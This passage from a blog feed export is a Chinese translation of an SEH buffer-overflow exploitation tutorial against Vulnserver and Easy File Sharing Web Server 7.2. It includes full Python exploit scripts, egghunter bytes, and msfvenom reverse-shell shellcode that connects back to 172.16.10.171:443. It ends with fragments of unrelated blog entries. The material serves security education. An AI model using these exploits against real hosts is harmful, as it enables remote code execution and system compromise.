+ 255 bad chars 发送BBBB以覆盖nSEH值 发送CCCC以覆盖SEH值 填充剩余空间 1DDDD... 我们这样做的原因是我们没有填充剩余空间，所以SEH不会触发 ps：由于SE处理程序（又称52字节）之后空间的限制，我决定在覆盖nSEH和SEH之前发送错误字符 检查内存转储，我们可以看到除了空字节又名，我们实际上有零个坏字符\x00 2.1.4 查找POP POP RET指令我已经详细说明POP POP RET了指令的顺序及其重要性，因此我将坚持实用并让上面的部分A Mention on POP POP RET进行讨论。 首先让我们找到一个适用的模块，该模块将使用以下带有mona的命令包含此指令序列 1!mona seh 在这里，一个明显的选择是突出的，efffunc.dll因为它没有使用任何安全机制（例如SafeSEH 或）进行编译ASLR 让我们双击该模块，然后验证组装说明并确保这是我们所需要的。 完美，我们有POP EBX POP EBP和RETN指令。这正是我们所需要的POP POP RET 对于这一部分，我建议您在POP POP RET函数的开头放置一个断点，以便您可以逐步进行下一部分以了解会发生什么，只需在mona中双击所选模块，然后按F2一下POP EBX说明即可。 现在，我将修改python脚本，以如下所示用指令seh的值覆盖变量POP POP RET。 123456789101112131415161718192021222324#!/usr/bin/pythonimport socketimport sysnseh = &quot;B&quot;*4seh = &quot;\xb4\x10\x50\x62&quot; #0x625010b4 pop,pop,retbuffer = &quot;A&quot; * 3515print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;buffer += nseh #BBBBbuffer += seh #CCCCjunk = &quot;D&quot;*(5000-len(buffer))buffer += junk #Bunch of D&quot;s to fill remaining spaceprint &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,9999))print &quot;[*] Connected to bof.local on Port 9999&quot;s.send((&apos;GMON /.:/&apos; + buffer))s.close()print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer) 让我们运行此脚本，再次跳转到Immunity，看看发生了什么。 在我们检查堆栈或内存转储之前，让我们快速检查一下SEH链 完美，SE处理程序指向POP POP RET我们所选DLL中的指令，在这种情况下0x625010B4-&gt;essfunc.dll 快速分析堆栈和内存转储也都可以。 当然，因为我们只是在应用程序处于崩溃状态时将所有内容拼凑在一起，但是让我们将我们的异常传递给程序，通过该程序将堆栈上的SE HandlerShift+F9的值发送到EIP寄存器，EIP寄存器将依次跳转按照我们的指示。POP POP RET 完善！正是我们所需要的，将我们的SE Handler值625010B4in推送到EIP了我们的POP POP RET说明中，如左上方所示。 现在，如果我们通过按逐步操作F7，则将首先进行操作POP EBX POP EBP，最后进行操作RETN，这将使我们达到nSEH的值-在这种情况下BBBB 只是为了更详细地解释这里发生了什么 POP EBX - POP的栈顶到EBX注册 - 7DEB6AB9 POP EBP - POP的栈顶到EBP注册 - 0237ED34 RETN - 返回 /堆栈的顶部为推动价值EIP寄存器 - 0237FFC4 现在您可能会注意到0237FFC4看起来很熟悉，如果再次查看SEH Chain，我们将看到0237FFC4对应于nSEH 如您所见，EIP点也024FFFC4与左上方的指令相关，查看这些指令，我们可以看到“ 42 42 42 42 which represents our“ B” * 4”。 2.1.5 生成Egghunter正如我已经谈到了为什么使用Egghunter以及它们如何工作一样，我将直接进入它，首先让我们分析堆栈以及在这里使用什么。 如前所述，需要3515字节来获取太nSEH，而需要3519字节来覆盖指向SE处理程序的指针，之后我们有52字节的空间，在这种情况下，由DDDDD...- 表示：-当然52字节对于我们的shellcode来说不是足够的空间，但是对于Egghunter来说已经足够了，因为我们只需要32个字节 - 只要我们可以使用相关的Egghunter 标签通过其他方式将shellcode放入内存，我们就应该能够执行。 像往常一样，由于简单，我将在此阶段使用mona来帮助我。 使用Mona生成Egghunter 1!mona egg -t MOCH 默认情况下，mona会生成一个带有默认标签的Egghunter，它的默认标签w00t可以很好地工作，但是在这里我选择指定一个自定义标签MOCH 完美，现在让我们将其添加到我们的利用脚本中 12egghunter = (&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;&quot;\xef\xb8\x4d\x4f\x43\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;) 值得注意的是，Egghunters也应检查以前发现的不良字符。 我们还将tag在变量TWICE中定义变量，以便Egghunter在执行和搜索内存时不会发现自己。 1egg = &apos;MOCHMOCH&apos; 我还将花时间junk用 123buffer += egghunterjunk = &quot;D&quot;*(5000-len(buffer))buffer += junk #Bunch of D&quot;s to fill remaining space 这将允许我们在SEH之后直接添加Egghunter shell代码，然后添加一堆D来填充剩余空间，以防万一。 现在让我们生成一些shell代码，对整体漏洞进行最后调整，然后尝试一下。 2.1.6 跳到Egghunter现在只是重申此处的目的是超速**SEH，执行一个POP POP RET序列，该序列又将nSEH的值压入EIP寄存器** -在这种情况下，我们希望将Egghunter的地址放在nSEH之上或以某种形式的指令将使我们跳入我们的Egghunter shellcode，再次，如果我们检查堆栈，我们会发现我们走得太远。 2.1.7 生成Shellcode和最终利用一如既往，我将在这里使用MSFVenom生成一些shellcode，因为我们并不是真正在与高级防病毒软件或任何其他工具作斗争，所以不必花哨，我们只需使用下面的代码即可。 1m0chan@kali:/&gt; msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00&quot; 现在生成了很棒的shell代码，我们只是将其弹出到最终的利用中。 在这种情况下，你可以看到我们会从内存地址跳转0237FFC4到0237FFCC这将是在那里我们Egghunter会坐下。 现在在这里，我们只是用0237FFCC覆盖nSEH的地址，但是就像我说的那样，它不是很实用，并且最好做一个简单的短跳转（也称为操作码）-但是有一个小的变化。该指令只有2个字节，nSEH需要4个字节。EB``EB 这不是一个大问题，因为我们可以简单地使用NOPSaka，\x90所以我们在这里要做的是填充nSEH，\x90\x90这意味着2/4个字节已满，然后是代表跳转6个字节的EB指令\xeb\x06。现在，nSEH中填充了4/4个字节 我们利用现在技术上跳8个字节，但我们只需要跳6个字节，因为我们真的只是滑动下来NOPS所以6个字节是所有的需要。 太好了，现在在漏洞利用程序中更新nSEH变量以反映以下内容 1nseh = &quot;\xeb\x06\x90\x90&quot; 当然，little endian再次是相反顺序的原因。 最终利用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/pythonimport socketimport sys#Vulnserver GMON SEH Overflow w/ Egghunter#Author: m0chan#Date: 28/08/2019nseh = &quot;\xeb\x06\x90\x90&quot; #0x909006be - nop,nop,jump 6 bytes with EB into egghunterseh = &quot;\xb4\x10\x50\x62&quot; #0x625010br pop,pop,reteggnops = &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;egghunter = (&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;&quot;\xef\xb8\x74\x65\x65\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)egg = &apos;MOCHMOCH&apos;#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 -e x86/shikata_ga_nai EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x80\x0a\x0c\x0d&quot;shellcode = (&quot;\xda\xc4\xbf\xcf\xa2\xc0\xf1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1&quot;&quot;\x52\x83\xeb\xfc\x31\x7b\x13\x03\xb4\xb1\x22\x04\xb6\x5e\x20&quot;&quot;\xe7\x46\x9f\x45\x61\xa3\xae\x45\x15\xa0\x81\x75\x5d\xe4\x2d&quot;&quot;\xfd\x33\x1c\xa5\x73\x9c\x13\x0e\x39\xfa\x1a\x8f\x12\x3e\x3d&quot;&quot;\x13\x69\x13\x9d\x2a\xa2\x66\xdc\x6b\xdf\x8b\x8c\x24\xab\x3e&quot;&quot;\x20\x40\xe1\x82\xcb\x1a\xe7\x82\x28\xea\x06\xa2\xff\x60\x51&quot;&quot;\x64\xfe\xa5\xe9\x2d\x18\xa9\xd4\xe4\x93\x19\xa2\xf6\x75\x50&quot;&quot;\x4b\x54\xb8\x5c\xbe\xa4\xfd\x5b\x21\xd3\xf7\x9f\xdc\xe4\xcc&quot;&quot;\xe2\x3a\x60\xd6\x45\xc8\xd2\x32\x77\x1d\x84\xb1\x7b\xea\xc2&quot;&quot;\x9d\x9f\xed\x07\x96\xa4\x66\xa6\x78\x2d\x3c\x8d\x5c\x75\xe6&quot;&quot;\xac\xc5\xd3\x49\xd0\x15\xbc\x36\x74\x5e\x51\x22\x05\x3d\x3e&quot;&quot;\x87\x24\xbd\xbe\x8f\x3f\xce\x8c\x10\x94\x58\xbd\xd9\x32\x9f&quot;&quot;\xc2\xf3\x83\x0f\x3d\xfc\xf3\x06\xfa\xa8\xa3\x30\x2b\xd1\x2f&quot;&quot;\xc0\xd4\x04\xff\x90\x7a\xf7\x40\x40\x3b\xa7\x28\x8a\xb4\x98&quot;&quot;\x49\xb5\x1e\xb1\xe0\x4c\xc9\x12\xe4\x44\xa2\x03\x07\x58\xb5&quot;&quot;\x68\x8e\xbe\xdf\x9e\xc7\x69\x48\x06\x42\xe1\xe9\xc7\x58\x8c&quot;&quot;\x2a\x43\x6f\x71\xe4\xa4\x1a\x61\x91\x44\x51\xdb\x34\x5a\x4f&quot;&quot;\x73\xda\xc9\x14\x83\x95\xf1\x82\xd4\xf2\xc4\xda\xb0\xee\x7f&quot;&quot;\x75\xa6\xf2\xe6\xbe\x62\x29\xdb\x41\x6b\xbc\x67\x66\x7b\x78&quot;&quot;\x67\x22\x2f\xd4\x3e\xfc\x99\x92\xe8\x4e\x73\x4d\x46\x19\x13&quot;&quot;\x08\xa4\x9a\x65\x15\xe1\x6c\x89\xa4\x5c\x29\xb6\x09\x09\xbd&quot;&quot;\xcf\x77\xa9\x42\x1a\x3c\xc9\xa0\x8e\x49\x62\x7d\x5b\xf0\xef&quot;&quot;\x7e\xb6\x37\x16\xfd\x32\xc8\xed\x1d\x37\xcd\xaa\x99\xa4\xbf&quot;&quot;\xa3\x4f\xca\x6c\xc3\x45&quot;)buffer = &quot;A&quot; * (3515-len(egg + shellcode))print &quot;[*] Adding Egghunter tag &quot; + egg + &quot; alongside A Buffer&quot;buffer += eggbuffer += shellcodeprint &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;buffer += nsehprint &quot;[*] Overwriting nSEH Value with &quot; + nsehbuffer += seh #0x625010br pop,pop,retprint &quot;[*] Overwriting SEH Value with &quot; + sehbuffer += eggnopsbuffer += egghunterjunk = &quot;J&quot;*(5000-len(buffer))buffer += junk #Bunch of D&quot;s to fill remaining spaceprint &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,9999))print &quot;[*] Connected to bof.local on Port 9999&quot;s.send((&apos;GMON /.:/&apos; + buffer))s.close()print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer) 443假设我们有一个打开的监听器，我们将收到一个反向外壳-在这里值得注意的是，这只能在Windows 7 x86此工作是由于Egghunter启动系统调用的方式，即INT 2E-整个体系结构稍有不同，因此我们的mona Egghunter将仅在 32 Bit 我决定创建此小图来从较高的角度表示漏洞，并尝试显示每个相关的跳转-我的visio技能不是很好，所以请问！ 2.2 无需Egghunter的轻松文件共享Web服务器7.2轻松文件共享Web服务器是Win XP / Win 7时代的遗留软件，它使访问者可以轻松地通过选择的Web浏览器轻松上传/下载文件，尽管它在被Stack Overflows充斥着众多漏洞时非常有用到SEH溢出。 2.2.1 模糊和发现崩溃与之前的示例类似，我将停留在模糊测试阶段，因为我不想花费大量时间对每个输入/参数进行模糊测试，也就是说，在此示例中，我们将以HTTP协议为目标并boozfuzz支持HTTP模糊测试，因此请检查一下！我很快将只写一篇关于模糊测试和不同技术的文章。 由于该漏洞位于HTTP中，因此有几种方法可以使用python做到这一点，我们可以使用该requests库，也可以仅通过端口80连接并发送原始HTTP请求。-我将在此处输入Port 80 / Raw Requests，并可能requests在最后重写脚本。 首先让我们从一个基本的FUZZ脚本开始，直到发生崩溃为止，这里的漏洞位于GET变量内部，底层应用程序试图在其中获取传递的输入内容，GET并且无法进行边界检查和任何清理等操作。 这是一个示例示例，我们将使用python发送HTTP请求 1234567891011GET /m0chan.txtAAAAAAAAAbufferhereAAAAAAA HTTP/1.1Host: 172.16.10.15Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: SESSIONID=5905; UserID=; PassWD=If-Modified-Since: Fri, 11 May 2012 10:11:48 GMTConnection: close 正如您在第1行上看到的那样，我们正在请求m0chan.txt旁边的缓冲区/图案。-让我们快速编写一些python脚本以使其变得更简单。 123456789101112131415161718192021#!/usr/bin/pythonimport socketimport sysimport stringbuffer = &quot;A&quot; * 5000payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;payload += &quot;Host: bof.local\r\n&quot;payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,80))print &quot;[*] Connected to bof.local on Port 80&quot;s.send((payload))s.close()print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload) 一旦完成运行（只要我们已EFSWS打开Immunity和/或连接），我们就会注意到我们实际上造成了崩溃，让我们分析下面的屏幕截图，看看我们做了什么。 如您所见，在这种情况下，我们已经用用户提供的输入超出了nSEH和SEH的地址AAAA 41414141-我们也对我们有些新的限制… EAX寄存器 -如您所见，右上方EAX包含的41414141是我们的A缓冲区。-稍后可能会有用。 2.2.2 寻找偏移现在，我们已经分析了崩溃并找到了漏洞，我们可以继续计算偏移量，并计算出使A&#39;s我们超出SEH和nSEH指针所需的时间。为此，我将通过以下命令使用mona来计算非重复字符串（也称为循环模式）。 1!mona pc 5000 现在，我将fuzzer.py再次使用我的脚本并将其修改为发送我的模式5000 A&#39;s 123456789101112131415161718192021#!/usr/bin/pythonimport socketimport sysimport stringbuffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6....&quot;payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;payload += &quot;Host: bof.local\r\n&quot;payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,80))print &quot;[*] Connected to bof.local on Port 80&quot;s.send((payload))s.close()print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload) 我们的应用程序现在将返回崩溃状态并报告访问冲突，但是如果我们检查SEH Chain并跳转到堆栈上的SE Handler的值，我们将注意到它实际上已经超出了我们的循环模式，而不是一长串A&#39;s 1!mona findmsp 1!mona po 3Ff4 运行以上任一命令都将报告，超出nSEH值的偏移量是4061字节 -我们现在可以修改漏洞利用以反映&quot;A&quot; * 4061 2.2.3 寻找坏字符在这里，我们将采用与上述相同的方法，在该方法中，我们将每个可能的字符发送到缓冲区旁边，并分析它们在内存转储中的显示方式-在此还值得注意的是，我们必须为\n＆排除字符，\r因为我们没有希望在我们的缓冲区旁边发送装盒返回和新行，以有效地分解原始HTTP请求。 我将在此处使用以下脚本。 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/pythonimport socketimport sysnseh = &quot;B&quot;*4seh = &quot;C&quot;*4badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)buffer = &quot;A&quot; * (4061-len(badchars))print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;print &quot;[*] Starting to GET Variable&quot;buffer += badchars #All of badcharsbuffer += nseh #BBBBbuffer += seh #CCCCjunk = &quot;D&quot;*(5000-len(buffer))buffer += junk #Bunch of D&quot;s to fill remaining spacepayload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;payload += &quot;Host: bof.local\r\n&quot;payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,80))print &quot;[*] Connected to bof.local on Port 80&quot;s.send((payload))s.close()print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload) 假设我们反复冲洗并找到内存转储中的所有无效字符，我们将找到所需的东西，在这种情况下，我的发现是 1\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c 2.2.4 查找POP POP RET指令在本文中，我已经对此进行了广泛的介绍，因此，我将直接进入操作并找到包含pop pop ret指令的模块。 当然，我们将再次使用mona通过以下方便的命令来完成此操作 1!mona seh 当然，这里的目标是找到一个未经任何安全限制（例如ASLR，Safe SEH等）编译的模块。 您会注意到，在运行时，!mona seh它会在日志窗口中显示10个结果，但没有一个真正适合您，很容易在这里感到困惑，并开始怀疑是否还有要使用的模块。然而！如果检查seh.txt位于mona工作目录中的.txt文件，您会发现一个非常大的文件，其中包含数百个，甚至数千个可用模块。 以我为例，我滚动浏览了所有以开头的模块，00以避免无意中在缓冲区中实现流氓空字节。 我选择的选项是 0x1000108b 现在，我将此值添加到我的python脚本中的SEH变量中，并执行它以验证我的想法是正确的，并且执行按预期进行。 更新的Python脚本 1234567891011121314151617181920212223242526272829#!/usr/bin/pythonimport socketimport sysnseh = &quot;B&quot;*4seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop retbuffer = &quot;A&quot; * 4061print &quot;[*] Starting to GET Variable&quot;buffer += nseh #BBBBbuffer += seh #pop pop retjunk = &quot;D&quot;*(10000-len(buffer))buffer += junk #Bunch of D&quot;s to fill remaining spacepayload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;payload += &quot;Host: bof.local\r\n&quot;payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,80))print &quot;[*] Connected to bof.local on Port 80&quot;s.send((payload))s.close()print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload) 执行后检查抗扰性显示SEH Handler现在已被我们的pop pop ret小工具（也称为1001ab99）的内存地址覆盖 而且，如果我们不通过Shift + F9将异常传递给程序，则会将nSEHpop pop ret的值和nSEH的值放置在EIP寄存器中以备执行。答对了！ 在这种情况下，053A6FAC是堆栈中nSEH的地址，因此我们执行此位置的任何内容都将被执行。如下面的屏幕截图所示。 2.2.5 生成Shellcode现在与VulnServer不同，在缓冲区之后我们可以使用的空间非常有限- 在这种情况下，精确到52字节，在我们的nSEH和SEH值之后，我们还有很多空间，精确到931字节。 现在，只要对我们的shell代码进行一点编码，我们就应该能够将我们的shellcode放在这里，并Short JMP在nSEH指针中添加一些代码直接跳入其中。 但是，首先让我们使用可信任的MSFVenom生成一些shellcode 1m0chan@kali:/&gt; msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c&quot; 您可能会注意到，这次我选择了分段式负载，而无段式只是为了帮助减小负载大小。 2.2.6 最终利用跳转到shell代码并执行最终的shellcode。为了安全起见，现在要做的所有工作就是将我们的shell代码D与一些缓冲区一起放在缓冲区中NOPS，并从nSEH执行6字节的跳转，该跳转将落入我们的NOP Sled并直接进入shellcode。 我们可以做到这一点 1nseh = &quot;\xeb\x06\x90\x90&quot; 现在我们的最终漏洞利用将如下所示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/pythonimport socketimport sysnseh = &quot;\xeb\x06\x90\x90&quot;seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret#msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c&quot;shellcodenops = &quot;\x90\x90\x90\x90&quot;shellcode = (&quot;\xbd\xe0\x3c\x1c\xcb\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;&quot;\x5b\x31\x6a\x14\x83\xea\xfc\x03\x6a\x10\x02\xc9\xe0\x23\x40&quot;&quot;\x32\x19\xb4\x24\xba\xfc\x85\x64\xd8\x75\xb5\x54\xaa\xd8\x3a&quot;&quot;\x1f\xfe\xc8\xc9\x6d\xd7\xff\x7a\xdb\x01\x31\x7a\x77\x71\x50&quot;&quot;\xf8\x85\xa6\xb2\xc1\x46\xbb\xb3\x06\xba\x36\xe1\xdf\xb1\xe5&quot;&quot;\x16\x6b\x8f\x35\x9c\x27\x1e\x3e\x41\xff\x21\x6f\xd4\x8b\x78&quot;&quot;\xaf\xd6\x58\xf1\xe6\xc0\xbd\x3f\xb0\x7b\x75\xb4\x43\xaa\x47&quot;&quot;\x35\xef\x93\x67\xc4\xf1\xd4\x40\x36\x84\x2c\xb3\xcb\x9f\xea&quot;&quot;\xc9\x17\x15\xe9\x6a\xdc\x8d\xd5\x8b\x31\x4b\x9d\x80\xfe\x1f&quot;&quot;\xf9\x84\x01\xf3\x71\xb0\x8a\xf2\x55\x30\xc8\xd0\x71\x18\x8b&quot;&quot;\x79\x23\xc4\x7a\x85\x33\xa7\x23\x23\x3f\x4a\x30\x5e\x62\x03&quot;&quot;\xf5\x53\x9d\xd3\x91\xe4\xee\xe1\x3e\x5f\x79\x4a\xb7\x79\x7e&quot;&quot;\xdb\xdf\x79\x50\x63\x8f\x87\x51\x94\x86\x43\x05\xc4\xb0\x62&quot;&quot;\x26\x8f\x40\x8a\xf3\x3a\x4a\x1c\x50\xaa\x40\x77\xc0\xc9\x54&quot;&quot;\x86\xaa\x47\xb2\xd8\x9c\x07\x6a\x99\x4c\xe8\xda\x71\x87\xe7&quot;&quot;\x05\x61\xa8\x2d\x2e\x08\x47\x98\x07\xa5\xfe\x81\xd3\x54\xfe&quot;&quot;\x1f\x9e\x57\x74\xaa\x5f\x19\x7d\xdf\x73\x4e\x1a\x1f\x8b\x8f&quot;&quot;\x8f\x1f\xe1\x8b\x19\x77\x9d\x91\x7c\xbf\x02\x69\xab\xc3\x44&quot;&quot;\x95\x2a\xf2\x3f\xa0\xb8\xba\x57\xcd\x2c\x3b\xa7\x9b\x26\x3b&quot;&quot;\xcf\x7b\x13\x68\xea\x83\x8e\x1c\xa7\x11\x31\x75\x14\xb1\x59&quot;&quot;\x7b\x43\xf5\xc5\x84\xa6\x85\x02\x7a\x35\xa2\xaa\x13\xc5\xf2&quot;&quot;\x4a\xe4\xaf\xf2\x1a\x8c\x24\xdc\x95\x7c\xc5\xf7\xfd\x14\x4c&quot;&quot;\x96\x4c\x84\x51\xb3\x11\x18\x52\x30\x8a\xab\x29\x39\x2d\x4c&quot;&quot;\xce\x53\x4a\x4c\xcf\x5b\x6c\x70\x06\x62\x1a\xb7\x9b\xd1\x05&quot;&quot;\x2a\x31\x2c\xae\xf3\xd0\x8d\xb3\x03\x0f\xd1\xcd\x87\xa5\xaa&quot;&quot;\x29\x97\xcc\xaf\x76\x1f\x3d\xc2\xe7\xca\x41\x71\x07\xdf&quot;)buffer = &quot;A&quot; * 4061print &quot;[*] Starting to GET Variable&quot;buffer += nseh #BBBBbuffer += seh #pop pop retbuffer += shellcodenopsbuffer += shellcodejunk = &quot;D&quot;*(10000-len(buffer))buffer += junk #Bunch of D&quot;s to fill remaining spacepayload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;payload += &quot;Host: bof.local\r\n&quot;payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,80))print &quot;[*] Connected to bof.local on Port 80&quot;s.send((payload))s.close()print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload) 与VulnServer相似-我还在Visio中创建了一个漂亮的小图，以演示该漏洞利用过程并从较高的角度进行跳转。 0x03 参考资料/资源特别鸣谢以下所有民众： https://h0mbre.github.io https://www.securitysift.com https://captmeelo.com https://www.fuzzysecurity.com https://securitychops.com https://nutcrackerssecurity.github.io/Windows4.html]]></content>
      <categories>
        <category>-翻译文章</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的漏洞库（不断跟新中）]]></title>
    <url>%2F2019%2F10%2F11%2F%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%BA%93%2F</url>
    <content type="text"><![CDATA[0x00 前言为了积累在工作中碰到的一些漏洞以及在一些文章中看到的一些漏洞，决定采用文本的方式记录下来，一来方便自己查看，二来也可以方便自己以后写报告。 0x01 web漏洞0x02 主机漏洞0x030x04###]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用telegram搭建一个rss订阅机器人]]></title>
    <url>%2F2019%2F10%2F10%2F%E4%BD%BF%E7%94%A8telegram%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AArss%E8%AE%A2%E9%98%85%E6%9C%BA%E5%99%A8%E4%BA%BA%2F</url>
